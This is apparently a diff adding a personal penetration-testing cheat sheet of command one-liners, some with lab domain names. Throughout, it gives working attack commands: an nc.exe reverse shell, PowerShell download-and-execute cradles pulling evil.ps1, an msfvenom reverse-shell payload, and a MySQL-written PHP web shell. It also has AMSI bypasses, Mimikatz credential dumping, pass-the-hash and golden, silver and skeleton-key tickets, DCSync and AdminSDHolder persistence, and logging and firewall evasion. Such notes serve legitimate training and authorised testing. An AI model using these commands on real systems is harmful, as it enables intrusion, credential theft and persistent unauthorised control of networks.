+gcc -m32 -o output.c input.c 	# Cross compile C code, compile 32 bit binary on 64 bit Linux.
+unset HISTORYFILE 	# Disable bash history logging.
+rdesktop X.X.X.X 	# Connect to RDP server from Linux.
+kill -9 $$ 	# Kill current session.
+chown user:group blah 	# Change owner of file or dir.
+chown -R user:group blah 	# Change owner of file or dir and all underlying files / dirs - recersive chown.
+chmod 600 file 	# Change file / dir permissions
+
+# GNUPG & PGP
+
+gpg --import key.asc 	# Import the key GNUPG
+gpg --decrypt file.pgp 	# Decrypt the file GNUPG
+
+pgp --import key.asc 	# Import Key PGP
+pgp --decrypt file.pgp 	# Decrypt PGP
+
+gpg2john private.asc > hash && john hash -w wordlist	# Cracking GNUPG
+
+# LINUX SYSTEM INFORMATION
+
+id 	# Current User Information
+uname -a 	# Kernel Version
+grep $USER /etc/passwd 		# Current User Information from /etc/passwd 
+lastlog 	# Most Recent Logins
+w 	# Who is currently logged onto the system 
+for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done 	# All Users Including UID and GID Information
+cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk '{print $1}' 	# List all UID 0 (root) Accounts
+cat /etc/passwd 	# Read passwd File
+cat /etc/shadow 	# Check readability of the shadow file
+sudo -l 	# What can we sudo without a password?
+cat /etc/sudoers 	# Can we read the /etc/sudoers file?
+cat /root/.bash_history 	# Can we read roots .bash_history file?
+find /home/* -name *.*history* -print 2> /dev/null 	# Can we read any other users’ .bash_history files?
+cat /etc/issue 		# Operating System
+cat /etc/*-release 	# Operating System
+ls -als /root/ 		# Can we list root’s home directory?
+echo $PATH 	# Current $PATH environment variable
+cat /etc/crontab && ls -als /etc/cron* 		# List all cron jobs
+find /etc/cron* -type f -perm -o+w -exec ls -l {} \; 	# Find world-writeable cron jobs
+ps auxwww 	# List running processes
+ps -u root 	# List all processes running as root
+ps -u $USER 	# List all processes running as current user
+find / -perm -4000 -type f 2>/dev/null 		# Find SUID files 
+find / -uid 0 –perm -4000 –type f 2>/dev/null 		# Find SUID files owned by root
+find / -perm -2000 -type -f 2>/dev/null 	# Find GUID files	
+find -perm -2 -type f 2>/dev/null 	# Find world-writable files
+ls -al /etc/*.conf 	# List all conf files in /etc/
+grep pass* /etc/*.conf 	# Find conf files that contain the string “pass*”
+lsof -n 	# List open files
+dpkg -l 	# List Installed Packages (Debian)
+ps aux | awk ‘{print $11}’ |xargs -r ls -la 2>/dev/null |awk ‘!x[$0]++’ 	# Print process binaries/paths and permissions oneliner
+
+# NETWORK INFORMATION
+
+cat /etc/resolv.conf 	# DNS Server
+ifconfig -a 	# List Current Network Interface Configuration 
+route 	# Current Network Route Information
+traceroute –n <ip address> 	# Trace our route across network segments
+arp -a 		# List our ARP Cache
+netstat -auntp 		# Established and Listening TCP/UDP Ports/Connections 
+ss -twurp 	# Listing active connections, processes, users and bytes 
+
+# DEBUG
+
+strace -s -f 12345 -e trace=recv,read <PROGRAM> 	# monitor the appplication calls of a binary
+ltrace ./<PROG_NAME> 	# track all Application & library calls of a program
+
+# MAPPING A NETWORK / lol
+
+for i in {1..255}; do (ping -c 1 10.1.1.${i} | grep "bytes from" &); done 	# Scan Hosts alive , oneliner , lol
+for i in {1..65535}; do (echo > /dev/tcp/10.200.80.1/$i) >/dev/null 2>&1 && echo $i is open; done 	# Scan Ports , oneliner , lol
+
+masscan -p-p1-65535 IP --rate=1000 	# Scan all ports
+masscan -p80,22,21,23,8080,10000 10.0.1.21 -i tun0 --rate 1000 	# Scan specific ports
+
+sudo netdiscover -i <INTERFACE> 	# discover hosts
+
+# PING SWEEP
+
+fping -a -g IPRANGE 	# PING SWEEP
+fping –a –g 10.54.12.0/24 	# PING SWEEP
+fping –a –g 10.54.12.0 10.54.12.255 	# PING SWEEP
+fping -a -g 192.168.82.0 192.168.82.255 2>/dev/null 	# PING SWEEP
+
+nmap –sn 200.200.0.0/16 	# PING SWEEP
+nmap –sn 200.200.123.1-12 	# PING SWEEP
+nmap –sn 172.16.12.* 	# PING SWEEP
+nmap –sn 200.200.12-13.* 	# PING SWEEP
+nmap –sn –iL hostslist.txt 	# PING SWEEP
+
+# HOST DISCOVERY
+
+nmap -sn 10.10.1.1-254 -vv -oA hosts        # host discovery nmap
+netdiscover -r 10.10.10.0/24        # host discovery 
+
+# DNS SERVER DISCOVERY
+
+nmap -p 53 10.10.10.1-254 -vv -oA dcs       # dns server discovery
+
+# NMAP SCRIPTS
+
+nmap -sV --script=vulscan/vulscan.nse       # nmap scripts
+ls /usr/share/nmap/scripts/ssh*     # Finding nmaps cripts for service
+nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T5 -A      # Running nmap vuln script
+
+# PIVOTING
+
+ip route add 192.168.222.0/24 via 10.175.34.1	 # ADD ROUTE MANUALLY / PIVOTING
+
+chisel server -p 8000 --reverse 	# chisel server / PIVOTING
+chisel client 10.10.14.54:8000 R:9001:localhost:9001 	# chisel client / port forward / PIVOTING
+chisel client 10.10.14.54:8000 R:socks 		# Chisel client / Dynamic / Socks5 / PIVOTING
+chisel client 10.10.14.54:8000 R:4444:10.10.10.240:80 	# Chisel Client / port forward to other machine in network / PIVOTING
+
+meterpreter > run autoroute -s 172.30.111.0/24 		# metasploit / meterpreter add route / PIVOTING
+
+ssh -R 8083:localhost:6666 [your host user]@[your host ip] 	# Reverse port forwarding / PIVOTING
+ssh -f -nNT -L 8080:localhost:80 user@IP 	# Port forward / -nNT Says to SSH to not set a terminal / -f to background the ssh process / -L indicates that is a local port forwarding request / PIVOTING
+ssh -f -N -D 9050 user@IP 	# Dynamic Tunnel Socks5 / PIVOTING
+
+sudo sshuttle -r USERNAME@SERVER_IP -x SERVER_IP 0/0 -vv 	# Create Tunnel / PIVOTING
+
+ncat -vv --listen 3128 --proxy-type http 	 # ncat hht proxy / pivoting
+
+ncat -lv --broker -m2 <port> 	# Port Foward / attacker / pivoting
+ncat -v <attacker_ip> <attacker_port> -c "ncat -v <host_to_pivot_to <port_on_final_target" 	# Port Foward / pivot / pivoting
+
+# TRANSFER FILES
+
+certutil -urlcache -f -split http://$IP/file file 	# transfer files in windows
+
+python3 -m pyftpdlib -p 21 	# Open a ftp server for transfer
+twistd -n ftp -p 21 -r /file/to/serve		# # Open a ftp server for transfer
+(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd 	# transfer ftp one liner windows
+
+nc -l -p 1234 > file (VICTIM) / nc -w 3 <target_ip> 1234 < file (ATTACKER) 	# transfer Files using netcat
+
+php -S 0.0.0.0:80 	# Open php server for transfer files
+
+python -m SimpleHTTPServer 80 	# open a python server for transfer / Python2 
+python3 -m http.server 80 	# # open a python server for transfer / Python3
+python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')" 	# transfer file one liner python
+
+ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start" 	# Open a server ruby for transfer
+
+scp -i KEY chisel user@target:/tmp/chisel-USERNAME 	# transfer file via ssh using key
+scp /tmp/payload.exe USER@IP:C:\\PATH(/PATH in LINUX) 	# transfer file via ssh
+
+impacket-smbserver sharename . 	# create share for transfer
+copy \\192.168.1.11\tools\file.ext file.ext	# To transfer files from Kali to Windows / SMB
+copy file.ext \\192.168.1.11\tools\file.ext	# To transfer files from Windows to Kali / SMB
+impacket-smbserver sharename $(pwd) -smb2support -user livestep -password password 	# Create smb server and share to transfer files / oneliner
+
+$pass = convertto-securestring 'password' -AsPlainText -Force 	# transfer files with powershell by smb / 1 of 3 commands
+$cred = New-Object System.Management.Automation.PSCredential('livestep', $pass) 	# transfer files with powershell by smb / 2 of 3 commands
+New-PSDrive -Name livestep -PSProvider FileSystem -Credential $cred -Root \\kaliIP\sharename 	# transfer files with powershell by smb / 3 of 3 commands
+
+atftpd --daemon --port 69 /dirwhereyouwanttoruntheserver 	# open a tftp server to transfer files
+tftp -i <[IP]> GET <[FILE]> 	# transfer the file tftp
+
+wget http://$ATTACKER/file 	# usual way to transfer files in linux
+
+curl http://$ATTACKER/file -O destinationdir 	# usual way to transfer files in linux
+curl http://10.10.51.196/webdav/shell.php -u wampp:xampp --upload-file shell.php 	# transfer files with authentication
+
+#  WINDOWS PRIVESC
+
+## JUICY POTATO
+
+juicypotato.exe -t * -p filepath -l 9002 -c '{CLSID}' 	# juicypotato privesc
+
+
+# FFUF
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u https://target/script.php?FUZZ=test_value -fs 4242 	# parameter fuzzing
+ffuf -w /path/to/wordlist -u https://target/FUZZ 	# Directory fuzzing
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://target -H "Host: FUZZ" -fs 4242 	# vhost fuzzing
+
+# GOBUSTER
+
+wfuzz -H "Host: FUZZ.enterprize.thm" --hc 404,403 --hh 85 -H "User-Agent: PENTEST" -c -z file,"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt" http://enterprize.thm  # vhost fuzzing
+gobuster -t 35 dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html  # directory fuzzing
+
+# WFUZZ
+
+wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>        # vhost fuzzing
+wfuzz -u 10.10.10.10/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   # directory fuzzing
+wfuzz -c -z file,date-wordlist.txt -d "date=FUZZ" --hw 0 -u http://10.10.62.67/api/site-log.php     # parameter fuzzing
+
+
+# JAVASCRIPT SCRAPPING
+
+python3 discraper.py -u <url> 	# scrape javascript content
+curl -s URL | grep -Po "(\/)((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0-9\{\}]+))" | sort -u 	# Extract all API endpoints from AngularJS & Angular javascript files
+
+# Fully Interactive TTY Shell
+
+rlwrap ncat -lvp port 		# It gives access to keyboard arrows and history / tty shell
+
+/usr/bin/script -qc /bin/bash /dev/null  	# script is almost everytime present on the machine / tty shell
+	
+## PWNCAT
+
+pwncat connect://10.10.10.10:4444   # Connect to a bind shell
+pwncat 10.10.10.10:4444     # Connect to a bind shell
+pwncat 10.10.10.10 4444     # Connect to a bind shell
+pwncat bind://0.0.0.0:4444  # Listen for reverse shell
+pwncat 0.0.0.0:4444     # Listen for reverse shell
+pwncat :4444      # Listen for reverse shell
+pwncat -lp 4444     # Listen for reverse shell
+pwncat ssh://user:password@10.10.10.10  # Connect via ssh
+pwncat user@10.10.10.10     # Connect via ssh
+pwncat user:password@10.10.10.10    # Connect via ssh
+pwncat -i id_rsa user@10.10.10.10   # Connect via ssh
+pwncat -p 2222 user@10.10.10.10     # SSH w/ non-standard port
+pwncat user@10.10.10.10:2222    # SSH w/ non-standard port
+pwncat reconnect://user@10.10.10.10     # Reconnect utilizing installed persistence / If reconnection failes and no protocol is specified, SSH is used as a fallback.
+pwncat reconnect://user@c228fc49e515628a0c13bdc4759a12bf    # Reconnect utilizing installed persistence / If reconnection failes and no protocol is specified, SSH is used as a fallback.
+pwncat user@10.10.10.10     # Reconnect utilizing installed persistence / If reconnection failes and no protocol is specified, SSH is used as a fallback.
+pwncat c228fc49e515628a0c13bdc4759a12bf     # Reconnect utilizing installed persistence / If reconnection failes and no protocol is specified, SSH is used as a fallback.
+pwncat 10.10.10.10  # Reconnect utilizing installed persistence / If reconnection failes and no protocol is specified, SSH is used as a fallback.
+pwncat -m windows 10.10.10.10 4444  # WINDOWS
+pwncat -m windows -lp 4444  # WINDOWS
+
+# RDP
+
+xfreerdp /v:10.10.10.10 /u:user /p:password +clipboard      #connecting RDP
+xfreerdp /v:10.10.55.35 /u:user /pth:HASH +clipboard        #Connecting RDP using Hash
+
+# PAYLOADS
+
+## MSFVENOM
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f hta-psh -o payload.hta         # HTA payload
+
+# MYSQL
+
+mysql -u admin -p -h 10.10.10.10      #connection
+show databases;     #provides a list of available databases.
+use <database>;     #navigates to the provided database.
+show tables;    #provides a list of available tables within the database.
+show columns from <table>;      #outputs columns of the provided table.
+select * from <table>;      #outputs all contents of the provided table.
+select '<?php $cmd=$_GET["cmd"];system($cmd);?>'' INTO OUTFILE '/var/www/html/shell.php';    #  inject our PHP code into a table and save the table into a file on the remote system
+
+
+# BRUTEFORCE
+
+## CEWL
+
+cewl -d 2 -m 5 -w docswords.txt http://10.10.10.10      # cewl
+-d depth    # cewl
+-m minimum word length      # cewl
+-w output file      # cewl
+--lowercase lowercase all parsed words (optional)       # cewl
+
+
+# POWERSHELL AD
+
+Import-Module C:\moduleps1      # import a Powershell Module
+Get-Command -Module Module.ps1      # Show all commands in a module | Powershell
+iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')      # Powershell Download execute cradle
+iex (iwr 'http://192.168.230.1/evil.ps1')       # Powershell+v3 Download execute cradle
+$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response     # Powershell Download execute cradle
+powershell –ExecutionPolicy bypass      # Powershell Bypass execution policy
+powershell –c <cmd>     # Powershell Bypass execution policy
+powershell –encodedcommand      # Powershell Bypass execution policy
+*******************         # Powershell AV|AMSI Bypasses for PowerShell - Invoke-PowerShellTcp
+$String = 'niamoDppA.metsyS'        # Powershell AMSI BYPASS 1/3 (AMSITrigger EXAMPLE)
+$classrev = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''     # Powershell AMSI BYPASS 2/3  (AMSITrigger EXAMPLE)
+$AppDomain = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('Cur rentDomain').GetValue($null, @())     # Powershell AMSI BYPASS 3/3  (AMSITrigger EXAMPLE)
+*******************         # Powershell AV|AMSI Bypasses for PowerShell - Invoke-PowerShellTcp
+$String = "stekcoS.teN" # Powershell AMSI BYPASS 1/3 (AMSITrigger Net.Sockets EXAMPLE)
+$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''    # Powershell AMSI BYPASS 2/3 (AMSITrigger EXAMPLE)
+if ($Reverse)   # Powershell AMSI BYPASS 3/3 (AMSITrigger EXAMPLE)
+
+
+******************* # Domain Enumeration using Powerview
+Get-Domain  # Powerview get current Domain
+Get-Domain –Domain moneycorp.local  # Powerview Get object of another domain
+Get-DomainSID   # Powerview Get domain SID for the current domain
+Get-DomainPolicyData    # Powerview Get domain policy for the current domain
+Get-DomainController    # Powerview Get domain controllers for the current domain
+Get-DomainController –Domain moneycorp.local    # Powerview Get domain controllers for another domain
+Get-DomainUser  # Powerview Get a list of users in the current domain
+Get-DomainUser –Identity user   # Powerview Get a list of users in the current domain
+Get-DomainUser -Identity student1 -Properties *     # Powerview Get list of all properties for users in the current domain
+Get-DomainUser -Properties samaccountname,logonCount    # Powerview Get list of all properties for users in the current domain
+Get-DomainUser -LDAPFilter "Description=*built*" |Select name,Description   # Powerview Search for a particular string in a user's attributes
+Get-DomainUser –SPN     # Powerview Find user accounts used as Service accounts
+Get-DomainComputer | select Name    # Powerview Get a list of computers in the current domain
+Get-DomainComputer –OperatingSystem "*Server 2016*" # Powerview Get a list of computers in the current domain
+Get-DomainComputer -Ping    # Powerview Get a list of computers in the current domain
+Get-DomainGroup | select Name   # Powerview Get all the groups in the current domain
+Get-DomainGroup –Domain <targetdomain>  # Powerview Get all the groups in the current domain
+Get-DomainGroup *admin*     # Powerview Get all groups containing the word "admin" in group name
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse    # Powerview Get all the members of the Domain Admins group
+Get-DomainGroup –UserName "student1"    # Powerview Get the group membership for a user
+Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups    # Powerview List all the local groups on a machine (needs admin privs on non-dc machines)
+Get-NetLocalGroup -ComputerName dcorp-dc -Recurse    # Powerview Get members of all the local groups on a machine (needs admin privs on non-dc machines)
+Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators    # Powerview Get members of the local group "Administrators" on a machine (needs admin privs on non-dc machines)
+Get-NetLoggedon –ComputerName <servername>  # Powerview Get actively logged users on a computer (needs admin privs)
+Get-LoggedonLocal -ComputerName dcorp-dc    # Powerview Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
+Get-LastLoggedOn –ComputerName <servername> # Powerview Get the last logged user on a computer (needs administrative rights and remote registry on the target)
+Invoke-ShareFinder –Verbose     # Powerview Find shares on hosts in current domain
+Invoke-FileFinder –Verbose  # Powerview Find sensitive files on computers in the domain
+Get-NetFileServer   # Powerview Get all fileservers of the domain
+Get-DomainGPO   # Powerview Get list of GPO in current domain
+Get-DomainGPO -ComputerIdentity dcorp-student1  # Powerview Get list of GPO in current domain
+Get-DomainGPOLocalGroup     # Powerview Get GPO(s) which use Restricted Groups or groups.xml for interesting users
+Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity dcorp-student1     # Powerview Get users which are in a local group of a machine using GPO
+Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose  # Powerview Get machines where the given user is member of a specific group
+Get-DomainOU    # Powerview Get OUs in a domain
+Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"    # Powerview Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
+Get-DomainObjectAcl -SamAccountName student1 –ResolveGUIDs  # Powerview Get the ACLs associated with the specified object
+Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose   # Powerview Get the ACLs associated with the specified prefix to be used for search
+Find-InterestingDomainAcl -ResolveGUIDs     # Powerview Search for interesting ACEs
+Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"    # Powerview Get the ACLs associated with the specified path
+Get-DomainTrust     # Powerview Get a list of all domain trusts for the current domain
+Get-DomainTrust –Domain us.dollarcorp.moneycorp.local   # Powerview Get a list of all domain trusts for the current domain
+Get-Forest      # Powerview Get details about the current forest
+Get-Forest –Forest eurocorp.local   # # Powerview Get details about the current forest
+Get-ForestDomain    # Powerview Get all domains in the current forest
+Get-ForestDomain –Forest eurocorp.local     # Powerview Get all domains in the current forest
+Get-ForestGlobalCatalog     # Powerview Get all global catalogs for the current forest
+Get-ForestGlobalCatalog –Forest eurocorp.local      # Powerview Get all global catalogs for the current forest
+Get-ForestTrust     # Powerview Map trusts of a forest
+Get-ForestTrust –Forest eurocorp.local  # Powerview Map trusts of a forest
+Find-LocalAdminAccess –Verbose  # Powerview Find all machines on the current domain where the current user has local admin access
+Find-DomainUserLocation -Verbose        # Powerview Find computers where a domain admin (or specified user/group) has sessions
+Find-DomainUserLocation -UserGroupIdentity "RDPUsers"       # Powerview Find computers where a domain admin (or specified user/group) has sessions
+Find-DomainUserLocation -CheckAccess        # Powerview Find computers where a domain admin session is available and current user has admin access
+Find-DomainUserLocation –Stealth        # Powerview Find computers (File Servers and Distributed File servers) where a domain admin session is available
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose      # Powerview Add FullControl permissions for a user to the AdminSDHolder Persistence
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose        # powerview interesting permissions (ResetPassword) for a user to the AdminSDHolder
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose     # powerview interesting permissions (WriteMembers) for a user to the AdminSDHolder
+Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}     # Powerview Check the Domain Admins permission as normal user ACLs AdminSDHolder persistence
+Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose        # Powerview Abusing FullControl ACLs AdminSDHolder persistence
+Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose     # Powerview Abusing ResetPassword ACLs AdminSDHolder persistence  
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose         # Powerview Add fullControl rights persistence ACLs - Rights Abuse
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose      # Powerview Add DCSync rights rights persistence ACLs - Rights Abuse
+Get-DomainUser -PreauthNotRequired -Verbose     # Powerview •	Enumerating accounts with Kerberos Preauth disabled
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}     # Powerview enumerate the permissions for RDPUsers on ACLs 1/3
+Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose     # Powerview enumerate the permissions for RDPUsers on ACLs 2/3
+Get-DomainUser -PreauthNotRequired -Verbose     # Powerview enumerate the permissions for RDPUsers on ACLs 3/3
+Get-DomainComputer -UnConstrained       # Powerview Discover domain computers which have unconstrained delegation enabled
+Get-DomainUser –TrustedToAuth       # Powerview Enumerate users with constrained delegation enabled
+Get-DomainComputer –TrustedToAuth       # Powerview Enumerate Computers and computers with constrained delegation enabled
+Get-NetGroupMember -GroupName "DNSAdmins"       # PowerView Enumerate the members of the DNSAdmis group
+
+# POWERUP.PS1
+
+Invoke-AllChecks        # PowerUp Run all checks
+Get-ServiceUnquoted -Verbose   # Powerup Get services with unquoted paths and a space in their name
+Get-ModifiableServiceFile -Verbose       # PowerUp Get services where the current user can write to its binary path or change arguments to the binary
+Get-ModifiableService -Verbose       # PowerUp Get the services whose configuration current user can modify
+
+# BLOODHOUND
+
+. SharpHound.ps1    # BloodHound Ingestor
+Invoke-BloodHound -CollectionMethod All     # BloodHound Collect method
+Invoke-BloodHound -CollectionMethod All -ExcludeDC      # BloodHound avoid detections like ATA
+bloodhound-python -u kai.bel -p password1 -ns 192.168.200.129 -d cs.org -c Al   # Enumerate with bloodhound-python
+
+# WinRM | Powershell Remoting
+
+Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)     # winrm execute commands or scriptblocks
+Invoke-Command –FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)    # winrm execute scripts from files
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)    # winrm execute locally loaded function on the remote machines
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList      # winrm passing Arguments (only positional arguments could be passed this way)
+Invoke-Command –Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)        # winrm  function call within the script is used
+
+$Sess = New-PSSession –Computername Server1     # winrm execute "Stateful" commands using Invoke-Command 1/3
+Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get-Process}        # winrm execute "Stateful" commands using Invoke-Command 2/3
+Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}     # winrm execute "Stateful" commands using Invoke-Command 3/3
+
+winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname        # use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts)
+
+# MIMIKATZ
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc     # mimikatz Dump Hashes
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'        # mimikatz  Dump credentials on a local machine
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'    # mimikatz Over Pass the hash (OPTH) generate tokens from hashes
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'  # mimikatz Pass the hash
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'     # mimikatz DCSync
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'       # mimikatz Golden Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'     # mimikatz silver Ticket
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local        # mimikatz Skeleton Key inject a skeleton key (password would be mimikatz) on a Domain Controller
+Invoke-Mimikatz -Command '"token::elevate""lsadump::sam"' -Computername dcorp-dc        # mimikatz Dump Directory Services Restore Mode (DSRM) password and compare hashes with output of 757+, First one is the DSRM local Administrator.
+Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'      # Priv Esc – Unconstrained Delegation
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'     # powerview DA token reused Priv Esc – Unconstrained Delegation
+
+# SAFETYKATZ
+
+SafetyKatz.exe "sekurlsa::ekeys"        # SafetyKatz Minidump of lsass and PELoader to run Mimikatz
+SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys>  /run:cmd.exe" "exit"      # Over Pass the hash (OPTH) generate tokens from hashes or keys
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"     # SafetyKatz DCSync
+
+# RUBEUS
+
+Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt      # rubeus Over Pass the hash (OPTH) generate tokens from hashes or keys (doesn't need elevation)
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt     # rubeus Over Pass the hash (OPTH) generate tokens from hashes or keys (doesn't elevation)
+Rubeus.exe kerberoast /stats    # rubeus list Kerberoast stats
+Rubeus.exe kerberoast /user:svcadmin /simple        # request a TGS
+
+
+# PERSISTENCE
+
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:808 0/Invoke-PowerShellTcp.ps1''')'"        # persistence Schedule Task using Silver Ticket 1/2
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"  # persistence Schedule Task using Silver Ticket 2/2
+Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator      # persistence Using SkeletonKey valid username and password as mimikatz
+Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD      # persistence DSRM (765+) Logon Behavior for the DSRM account needs to be changed before passing the hash (760+)
+
+
+# Priv Esc – Unconstrained Delegation - Printer Bug
+
+Rubeus.exe monitor /interval:5 /nowrap      # capture the TGT of dcorp-dc$ Printer Bug Unconstrained Delegation
+MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local         # run MS-RPRN.exe Printer Bug (https://github.com/leechristensen/SpoolSample) Unconstrained Delegation
+Rubeus.exe ptt /ticket:<base64 encode>      # Printer Bug Copy the base64 encoded TGT, remove extra spaces (if any) Unconstrained Delegation
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'     #  Printer Bug Once the ticket is injected, run DCSync Unconstrained Delegation
+
+# FIREWALL EVASION SCAN
+
+nmap -D DECOY1_IP1,DECOY_IP2,ME         # firewall evasion Hide a scan with decoys
+nmap -D RND,RND,ME          # firewall evasion Hide a scan with random decoys
+nmap --proxies PROXY_URL        # firewall evasion Use an HTTP/SOCKS4 proxy to relay connections
+nmap --spoof-mac MAC_ADDRESS        # firewall evasion Spoof source MAC address
+nmap -S IP_ADDRESS      # firewall evasion Spoof source IP address
+nmap -g PORT_NUM        # firewall evasion Use a specific source port number
+nmap -sS -Pn -f -F MACHINE_IP       # firewall evasion Fragment Your Packets with 8 Bytes of Data
+nmap -sS -Pn -ff -F MACHINE_IP       # firewall evasion Fragment Your Packets with 16 Bytes of Data
